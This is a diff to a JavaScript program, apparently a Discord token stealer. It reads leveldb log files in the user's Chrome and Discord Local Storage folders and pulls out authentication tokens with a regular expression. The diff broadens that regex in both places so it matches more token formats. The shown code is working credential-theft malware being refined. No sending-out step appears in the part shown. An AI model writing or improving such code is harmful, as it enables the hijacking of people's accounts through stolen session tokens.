@@ -25,7 +25,7 @@ function Main(){
             files.forEach(file =>{
                 if(file.indexOf("log") != -1){
                     const log_data = Fs.readFileSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\${file}`, "utf8")
-                    const tokens = Array.from(log_data.matchAll(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/g))
+                    const tokens = Array.from(log_data.matchAll(/(mfa\.[a-z0-9_-]{20,})|([a-z0-9_-]{23,28}\.[a-z0-9_-]{6,7}\.[a-z0-9_-]{27})/g))
                     var result_tokens = ""
                     
                     if(tokens.length == 0){
@@ -62,7 +62,7 @@ function Main(){
             files.forEach(file =>{
                 if(file.indexOf("log") != -1){
                     const log_data = Fs.readFileSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Roaming\\discord\\Local Storage\\leveldb\\${file}`, "utf8")
-                    const tokens = Array.from(log_data.matchAll(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/g))
+                    const tokens = Array.from(log_data.matchAll(/(mfa\.[a-z0-9_-]{20,})|([a-z0-9_-]{23,28}\.[a-z0-9_-]{6,7}\.[a-z0-9_-]{27})/g))
                     var result_tokens = ""
                     
                     if(tokens.length == 0){
